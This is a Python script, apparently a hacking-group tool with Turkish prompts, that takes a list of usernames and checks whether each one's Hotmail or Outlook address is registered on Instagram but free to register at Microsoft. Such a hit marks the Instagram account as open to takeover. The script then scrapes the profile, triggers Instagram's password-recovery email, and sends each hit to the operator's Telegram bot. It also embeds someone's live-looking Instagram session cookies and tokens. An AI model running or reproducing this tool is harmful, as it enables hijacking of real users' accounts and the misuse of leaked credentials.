import threading,rich,secrets,user_agent,requests,os
from threading import Lock
import rich
import concurrent.futures
from rich.console import Console
from rich.text import Text
import requests
from secrets import token_hex
import uuid
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor
from requests import post
from requests import get
cok = token_hex(8) * 2
uuid = str(uuid.uuid4())
console = Console()
import time
import webbrowser
webbrowser.open('https://t.me/siberImpact')
import time

foo = False
if foo:
    pass
from datetime import datetime
current_time = datetime.now()
expiry_time = datetime.strptime('''2029-3-30 00:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
if current_time > expiry_time:
    print('SÛRE BİTTİ FREE İÇİN KANALA GEL [!]')
    exit(0)
def sg(*a, **b):
        with Lock():
            print(*a, **b)
class com:
    def red():
        return '\x1b[1;31m'
    def grn():
        return '\x1b[1;32m'
    def yalo():
        return '\x1b[1;33m'
    def blo():
        return '\x1b[1;36m'
    def orde():
        return '\x1b[1;35m'
    def blodk():
        return '\033[1;34m'
    def A():
        return '\033[2;39;40m'
    def brt():
        return '\x1b[38;2;255;165;0m'
class Sajad:
    def __init__(self):
        self.namefile=') 𝑳𝑰̇𝑺𝑻 𝑨𝑫𝑰 𝑮𝑰̇𝑹 : '
        self.loob=0
   
        self.badighot=0
        self.badigout=0
        self.okhot=0
        self.okout=0
        self.badhot=0
        self.badout=0
        self.goodhotandout='𝑯𝑰𝑻'
        self.badmain='𝑯𝑨𝑻𝑨𝑳𝑰'
        self.badinsta='𝑵𝑶𝑹𝑴𝑨𝑳'
        self.tokenbot()
    def chkfile(self):
        while True:
        	filename = input(self.namefile)
        	try:
        	       with open(filename, 'r+') as user_file:
        	       	 lines = user_file.readlines()
        	       	 self.nambrline = len(lines)
        	       break
        	except FileNotFoundError:
        	   print('𝑫𝑶𝑺𝒀𝑨 𝑩𝑼𝑳𝑼𝑵𝑴𝑨𝑫𝑰 !!')
        	   continue
        os.system('cls' if os.name == 'nt' else 'clear')
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            for use in lines:
            	executor.submit(self.chk, use)
            	
    def tokenbot(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        text = Text(") 𝑻𝑶𝑲𝑬𝑵 𝑮𝑰𝑹 𝑩𝑹𝑶 : ", style="bold underline italic")
        self.token = console.input(text)
        self.idtle()
    def chk(self,use):
        #sg(user)
        try:
        	sg(f"\r\t {com.grn()}{self.goodhotandout}{com.A()}-[{com.blodk()}{self.okhot}{com.A()}-{com.blodk()}{self.okout}{com.A()}]{com.yalo()}{self.badmain}{com.A()}-[{com.blodk()}{self.badhot}{com.A()}-{com.blodk()}{self.badout}{com.A()}]{com.red()}{self.badinsta}{com.A()}-[{com.blodk()}{self.badighot}{com.A()}-{com.blodk()}{self.badigout}{com.A()}]{com.brt()}{self.loob}{com.A()}•{com.brt()}{self.nambrline}{com.A()}•{com.orde()}{'{:.0%}'.format(self.loob/float(self.nambrline))}\r",end='')
        
        except Exception as e:
        	sg(e)
        #domn=user
        dom=['@hotmail.com','@outlook.com']
        for domin in dom:
            user = use.strip()
            email = f"{user}{domin}"
            #sg('\n')
            #sg(email)
           # sg('\n')
            url='https://www.instagram.com/api/v1/web/accounts/check_email/'
            heedrs={
                    'Accept':'*/*',
                    'Accept-Encoding':'gzip, deflate, br',
                    'Accept-Language':'en-US,en;q=0.9,ar;q=0.8',
                    'Content-Length':'38',
                    'Content-Type':'application/x-www-form-urlencoded',
                    'Sec-Ch-Prefers-Color-Scheme':'dark',
                    'Sec-Ch-Ua':'"Not-A.Brand";v="99", "Chromium";v="124"',
                    'Sec-Ch-Ua-Full-Version-List':'"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
                    'Sec-Ch-Ua-Mobile':'?1',
                    'Sec-Ch-Ua-Model':'"22021211RG"',
                    'Sec-Ch-Ua-Platform':'"Android"',
                    'Sec-Ch-Ua-Platform-Version':'"13.0.0"',
                    'Sec-Fetch-Dest':'empty',
                    'Sec-Fetch-Mode':'cors',
                    'Sec-Fetch-Site':'same-origin',
                    'User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                    'Viewport-Width':'393',
                    'X-Asbd-Id':'129477',
                    'X-Csrftoken':'uSc1c91qJGdndg6WgSwdic8Z6npY6lgJ',
                    'X-Ig-App-Id':'1217981644879628',
                    'X-Ig-Www-Claim':'hmac.AR11z00N_IbRNGrzU_J3F40kHM4ANWlo_Iwb9V-urNnx3qQw',
                    'X-Instagram-Ajax':'1011900369',
                    'X-Requested-With':'XMLHttpRequest',
                    }
            data={
                    'email': email
                    }
            req=requests.post(url,headers=heedrs,data=data).text
        #    sg(req)
            if 'email_is_taken' in req:
                cookies = {
                            'mkt': 'ar-YE',
                            f'MicrosoftApplicationsTelemetryDeviceId': '{Lol}',
                            'MUID': f'{cok}',
                            'mkt1': 'ar-AR',
                            'ai_session': 'CyuLoU6vSi7HJzZeYNyVoH|1709731817506|1709731817506',
                            'amsc': f'{self.amsc}',
                            'clrc': '{%2219789%22%3a[%22+VC+x0R6%22%2c%22FutSZdvn%22%2c%22d7PFy/1V%22]}',
                        }
                headers = {
                            'authority': 'signup.live.com',
                            'accept': 'application/json',
                            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                            'canary': f'{self.canary}',
                            'content-type': 'application/json',
                            'hpgid': '200639',
                            'origin': 'https://signup.live.com',
                            'referer': 'https://signup.live.com/signup?mkt=AR-AR&lic=1&uaid=ad311362ab454b14bb81937965f86b8d',
                            'scid': '100118',
                            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                            'sec-ch-ua-mobile': '?1',
                            'sec-ch-ua-platform': '"Android"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'tcxt': 'VWlP20OW8k/xH6tFupQw1HwrEFETf+tDxcIS0OeqhsBSbBIMy4srnqBeqY1i2lMA5VbPfXSuTUEhdSw9AWoPPSNJeuzfyYceefIZ/1EGoBqppRyXgczQuaM5teemKuAKiUXDaBYMj8Ng8fhejlVVuQmHCBl+PgEGlG7A/8uqXNwqIlrg9tbOqIzHkn5X1jUytMlmFxmEjdLCQnainFfCoxqgPZjkQwcE6hQFElIuxniqWRWk6lmEleIPwhGFID2kbSE5kxjiT5eoUt/S5zxP2a1Yp+shu8ITJrys5pkwMbsWO+L18h8bH4+BG3LFLJk00zd28yeJz7uTq3NRNR1uK+OiCVwGdB5JhxmvsItOIwHc83/xeN0XuTlXGgueChmPKulABKjR4v0VDkutbyPQwRVqRPRALfutQaEjOXdx9FXOCUTySJLtPpeMPIj172+PUSlBhgueKn3Iiz2mzKbR8Kv4JgBlQF5m3dVYyNpSN998fVQE3x94ruAsioYwEOBdfEViB34QpbzAuNfoNmNisCvzI9PKzc+cDKeWkcVd7OtYQSR0AR2Ibr6LE0iulNI5/zqg/BYp3Vf2zaExAmpf8Q==:2:3',
                            'uaid': f'{uuid}',
                            'uiflvr': '1001',
                            'user-agent': generate_user_agent(),
                            'x-ms-apitransport': 'xhr',
                            'x-ms-apiversion': '2',
                        }
                params = {
                            'mkt': 'AR-AR',
                            'lic': '1',
                            'uaid': f'{uuid}',
                        }
                data = {
                                'signInName': f'{email}',
                                'uaid': f'{uuid}',
                                'includeSuggestions': True,
                                'uiflvr': 1001,
                                'scid': 100118,
                                'hpgid': 200639,
                            }
                req = requests.post('https://signup.live.com/API/CheckAvailableSigninNames',params=params,cookies=cookies,headers=headers,json=data,).text
                if '"isAvailable":true' in req:
                    if '@outlook.com' in email:self.okout+=1
                    else:self.okhot+=1
                    try:
                        url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}'
                        headers = {
                                    'Accept': '*/*',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                                    'Cookie': 'mid=ZHTlnQALAAFHZAE8G64BeLHXNMv6; ig_did=ACB29C06-4F89-4B7A-9D37-DC433D1E9398; ig_nrcb=1; datr=nUZ1ZAphhPG3siVLQu3QFbkq; fbm_124024574287414=base_domain=.instagram.com; csrftoken=1gI1BSItuCt7GpIB7BL3KCrapTfKligx; ds_user_id=55002803434; sessionid=55002803434%3A1m1laRSPbJaoKD%3A24%3AAYdWXJwfQhhN68tU0NIkcNODEtrIYnAgKCWPkrp3Rg; shbid="12254\05455002803434\0541717693792:01f7d20c44658c09775e0f963159681bf19a10be70bbe95b497a89f112ac2fc01ab50da0"; shbts="1686157792\05455002803434\0541717693792:01f7c175c7d720e51402db9b91b351fab16619ea5a91f0ce421bc4c9827bce14e62426c5"; fbsr_124024574287414=Z3GOftVJ7wWK4lDsT4vYGKDlPKHv5vYXWQpT8AYi130.eyJ1c2VyX2lkIjoiMTAwMDg3NjM5MTE3ODM3IiwiY29kZSI6IkFRRHRIbWwtakhjY25sQmxidDJmcGpDZmtLV2stb2FQY0lLbHpWQWtfMUlhLTNqMF9wdlhsaFUyTnJvYXRsT2lvUmJfSXNzc19oSXFyYzFRX3BLZ1RaX1RSTEhCbGpzRTFHZkFjWWJoX0Q4aVVwYWdSR2Q0bVNXcUVwai1SajlkT1J5RmxadzZHbWZCc0ZCbVdUY0RDNDAzUFVnTzV2TVBONk1UcmpSUDlpTU85dFdSc0hURFdsUVhrNDJycVhvbzM2SHlnYXRNdDJMRWlNNUZrcmVfRWtiWGUzTTlqdzY4enpKT2RVUjlIUmt2TUlXcWZqQ2RUc3FmYUo5MWowUF95bm9aLVZCSnpmb0xuSkt3MV9JTkFTQzdEZmM3ZURIeDFiTkFyRS1SQ1FhYUp3ZWtydVdzMFBYaV9pTDdYTlZrRTg5Yy1oYWVrWVI1YU45cDhwVXp0ZXBsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUhiWkNnM3M0UXJRZmhyOXRaQm5mdHI2cTlsYXJNMnpRaFpDZTNlczJOTGkwNGc4NGJaQldRTWs4VlpDWkNZMVZ3ak52azJ4M0d0VkxaQTdPajhZWkFkNklDdUxtMjI0NllhVTZQdXRlMk1PU3haQnpxbDhxUnU2UDhRYTZnRXhpUGRRbHB5WWJYSmVRczB3N2UzdFRxZXdnQWdUYXNpYzRjd0d3MHpaQUxTdXNCVUN3Y0JnVnk3MmdaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjg2MjA3NDQ4fQ; rur="ODN\05455002803434\0541717743459:01f7dc2b656c6f698ae45a64240745cb3e01e62cb90350349fcf91dba76a5d92e481be60"',
                                    'Referer': 'https://www.instagram.com/5u2.a/',
                                    'Sec-Ch-Prefers-Color-Scheme': 'dark',
                                    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                                    'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.110", "Google Chrome";v="114.0.5735.110"',
                                    'Sec-Ch-Ua-Mobile': '?0',
                                    'Sec-Ch-Ua-Platform': '"Windows"',
                                    'Sec-Ch-Ua-Platform-Version': '"10.0.0"',
                                    'Sec-Fetch-Dest': 'empty',
                                    'Sec-Fetch-Mode': 'cors',
                                    'Sec-Fetch-Site': 'same-origin',
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                                    'Viewport-Width': '624',
                                    'X-Asbd-Id': '129477',
                                    'X-Csrftoken': '1gI1BSItuCt7GpIB7BL3KCrapTfKligx',
                                    'X-Ig-App-Id': '936619743392459',
                                    'X-Ig-Www-Claim': 'hmac.AR2f295htsHXPFyt6RxGipeoIQHM6Vikj5SuhBSAT7RgrCSq',
                                    'X-Requested-With': 'XMLHttpRequest',}
                        rr = get(url,headers=headers).json()
                        name = rr['data']['user']['full_name']
                        bio = rr['data']['user']['biography']
                        fol = rr['data']['user']['edge_followed_by']['count']
                        fols = rr['data']['user']['edge_follow']['count']
                        id = rr['data']['user']['id']
                        url='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
                        haha={
                                 'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
                                 'X-Pigeon-Rawclienttime':'1707104597.347',
                                 'X-IG-Connection-Speed':'-1kbps',
                                 'X-IG-Bandwidth-Speed-KBPS':'-1.000',
                                 'X-IG-Bandwidth-TotalBytes-B':'0',
                                 'X-IG-Bandwidth-TotalTime-MS':'0',
                                 'X-IG-VP9-Capable':'false',
                                 'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                                 'X-IG-Connection-Type':'WIFI',
                                 'X-IG-Capabilities':'3brTvw==',
                                 'X-IG-App-ID':'567067343352427',
                                 'User-Agent':'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
                                 'Accept-Language':'ar-IQ, en-US',
                                 'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
                                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                                 'Accept-Encoding':'gzip, deflate',
                                 'Host':'i.instagram.com',
                                 'X-FB-HTTP-Engine':'Liger',
                                 'Connection':'keep-alive',
                                 'Content-Length':'364',
                                        }
                        ada={
                             'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{user}''"}',
                             
                             'ig_sig_key_version':'4',}
                        s=post(url,headers=haha,data=ada).text
                        if '"𝑬𝑷𝑶𝑺𝑻𝑨 𝑮𝑶𝑵𝑫𝑬𝑹𝑰𝑳𝑫𝑰"' in s:
                            try:rest = s.split('"email":"')[1].split('","status":"')[0]
                            except:rest = '𝑨𝑲𝑻𝑰𝑭!!'
                        else:rest='𝑨𝑲𝑻𝑰𝑭!!'
                        re=get(f'https://o7aa.pythonanywhere.com/?id={id}').json()
                        datet=re['date']
                        self.fj=self.okhot+self.okout
                        from rich import print 
                        from rich.panel import Panel
                        from rich.console import Console
                        from rich.text import Text
                        infoprint=f"""
[green]༄ 𝑨𝑫 ~ [yellow]{name}[/yellow][/green]
[green]༄ 𝑮𝑴𝑨𝑰𝑳 ~  [yellow]{email}[/yellow][/green]
[green]༄ 𝙏𝘼𝙆𝙄𝙋 ~  [yellow]{fols}[/yellow][/green]
[green]༄ 𝙏𝘼𝙆𝙄̇𝙋𝘾̧𝙄̇ ~  [yellow]{fol}[/yellow][/green]
[green]༄ 𝑲𝑼𝑹𝑼𝑳𝑼𝑺̧ ~  [yellow]{datet}[/yellow][/green]
[green]༄ 𝑹𝑬𝑺𝑬𝑻 ~  [yellow]{rest}[/yellow][/green]
[green]༄ 𝑩𝑰𝑶 ~ [yellow]{bio}[/yellow][/green]
[green]༄ 𝑼𝑹𝑳 ~ https://www.instagram.com/{user}[yellow]
                        """
                        console.rule(f"𝑯𝑰𝑻 𝑩𝑹𝑶|{self.fj}")
                        print(Panel(infoprint))
                        console.rule("𝑻𝑬𝑳𝑬𝑮𝑹𝑨𝑴 @SenicHack")
                        infosand=f"""
⋘─────━༄𝙄𝙈𝙋𝘼𝘾𝙏༄━─────⋙
༄ 𝑯𝑰̇𝑻 ~ {self.fj}
༄ 𝑨𝑫 ~ {name}
༄ 𝑲.𝑨𝑫 ~ {user}
༄ 𝑮𝑴𝑨𝑰𝑳 ~ {email}
༄ 𝑻𝑨𝑲𝑰𝑷𝑪̧𝑰 ~ {fol}
༄ 𝑻𝑨𝑲𝑰𝑷 ~ {fols}
༄ 𝑲𝑼𝑹𝑼𝑳𝑼𝑺̧ ~ {datet}
༄ 𝑹𝑬𝑺𝑬𝑻 ~ {rest}
༄ 𝑩𝑰𝑶 ~ {bio}
༄ 𝑰𝑫 ~ {id}
༄ 𝑼𝑹𝑳 ~ https://www.instagram.com/{user}
⋘─────━༄𝙄𝙈𝙋𝘼𝘾𝙏༄━─────⋙
𝑻𝑬𝑳𝑬𝑮𝑹𝑨𝑴- 
@SenicHack
                        """
                        requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.Id}&text={infosand}")
                    except:
                        infosand=f"""
𝑯𝑨𝑻𝑨𝑳𝑰 𝑹𝑬𝑺𝑬𝑻 {self.fj}
𝑮𝑴𝑨𝑰𝑳  - {email}
"""
                        requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.Id}&text={infosand}")
                else:
                   if '@outlook.com' in email:self.badout+=1
                   else:self.badhot+=1
            else:
                if '@outlook.com' in email:self.badigout+=1
                else:self.badighot+=1
                
                        
        self.loob+=1
                
    def idtle(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            text = Text(") 𝑰𝑫 𝑮𝑰𝑹 𝑩𝑹𝑶 :  ", style="bold underline italic")
            self.Id = int(console.input(text))
        except ValueError as error:
            self.idtle()
        self.getcnre()
    
    def getcnre(self):
        req=requests.post('https://signup.live.com',headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',})
        self.amsc=req.cookies.get_dict()['amsc']
        encoded=req.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1]
        self.canary = encoded.encode().decode('unicode-escape')
        os.system('cls' if os.name == 'nt' else 'clear')
        self.chkfile()
        
    
    
        
            
            
        
            
            

if __name__=='__main__':
	Sajad()
	
